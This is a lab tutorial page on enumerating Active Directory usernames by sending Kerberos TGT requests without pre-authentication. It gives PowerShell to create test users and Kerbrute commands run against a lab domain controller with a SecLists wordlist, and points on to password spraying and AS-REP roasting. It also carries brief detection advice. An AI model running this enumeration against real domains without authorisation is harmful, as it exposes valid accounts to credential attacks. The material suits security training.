---
description: >-
  It is possible to enumerate valid usernames without authentication by sending
  TGT requests with no pre-authentication.
---

# Username Enumeration

## Configuring

1. To implement the attack we need to create a couple users with easy guessable usernames. To do this we can choose some usernames from a popular [list of usernames](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt) from the [SecLists](https://github.com/danielmiessler/SecLists) repository. We will create the following users:

```
john
david
robert
chris
mike
dave
richard
thomas
steve
mark
```

### Creating users

2\. Previously we created users by using the GUI. Now we will create users using PowerShell. Create the file `users.txt` and place the usernames in there. Then create the users:

```
# Place users in users.txt
cd C:\
notepad users.txt

# Creating users
$password = ConvertTo-SecureString 'ReallySecurePassword123!' -AsPlainText -Force
$files = Get-Content -Path C:\users.txt
ForEach ($name in $files) {
New-ADUser -Name "$name" -GivenName "$name" -SamAccountName "$name" -UserPrincipalName $name@amsterdam.bank.local -Path "OU=Employees,DC=amsterdan,DC=bank,DC=local" -AccountPassword $password -Enabled $true
}
```

![](<../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png>)

3\. Run the command below to get a list of all the users and check if the users are created:

```
Get-ADUser -Filter * | Select-Object Name
```

![](<../../../.gitbook/assets/image (15) (2) (1).png>)

## Attacking

### How it works

> _To enumerate usernames, send TGT requests with no pre-authentication. If the KDC responds with a `PRINCIPAL UNKNOWN` error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists._
>
> _Source:_ [_https://github.com/ropnop/kerbrute#user-enumeration_](https://github.com/ropnop/kerbrute#user-enumeration)\_\_

### Executing the attack

1. To enumerate usernames we can use the tool [Kerbrute](https://github.com/ropnop/kerbrute). To install Kerbrute on Kali download the latest [release](https://github.com/ropnop/kerbrute/releases) from GitHub and save it somewhere. I would recommend `/opt`.

![](<../../../.gitbook/assets/afbeelding (31).png>)

2\. For the list of usernames download the [xato-net-10-million-usernames.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt) list from [SecLists](https://github.com/danielmiessler/SecLists).

```
wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/xato-net-10-million-usernames.txt
```

3\. After downloading the tool and the username list run Kerbrute against the domain `amsterdam.bank.local` and DC `10.0.0.3`. Pipe the command to `tee` to save the output to the txt file `username_enum.txt`.&#x20;

```
./kerbrute_linux_amd64 userenum -d amsterdam.bank.local --dc 10.0.0.3 xato-net-10-million-usernames.txt | tee username_enum.txt
```

These valid users can be used for AS-REP roasting or Password Spraying Attacks. For now save these users to `usernames.txt`.

![](<../../../.gitbook/assets/image (22) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

4\. To only get a list of usernames execute the following which will cut the output to only get the usernames, changes everything to lowercase and sorting for unique entries:

```
cat username_enum.txt | grep bank.local | cut -d " " -f 8- | cut -d "@" -f 1 | sed 's/./\L&/g' | sort -u > users.txt

cat users.txt                                                                                                       
administrator
bank
chris
dave
david
john
mark
mike
richard
robert
steve
thomas
```

5\. From here we can execute the following attacks to gain access to the domain:



{% content-ref url="password-spraying.md" %}
[password-spraying.md](password-spraying.md)
{% endcontent-ref %}

{% content-ref url="empty-password.md" %}
[empty-password.md](empty-password.md)
{% endcontent-ref %}

{% content-ref url="as-rep-roasting.md" %}
[as-rep-roasting.md](as-rep-roasting.md)
{% endcontent-ref %}

## Defending

### Recommendations

* I don't know any configurations to block the enumeration of usernames. The best way to block this is using a non traditional naming convention for the samaccountnames.

### Detection

The attack generates the Windows event ID [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) "A Kerberos authentication ticket (TGT) was requested" if Kerberos logging is enabled.

**Work in Progress**

## References

{% embed url="https://github.com/danielmiessler/SecLists" %}

{% embed url="https://github.com/ropnop/kerbrute" %}
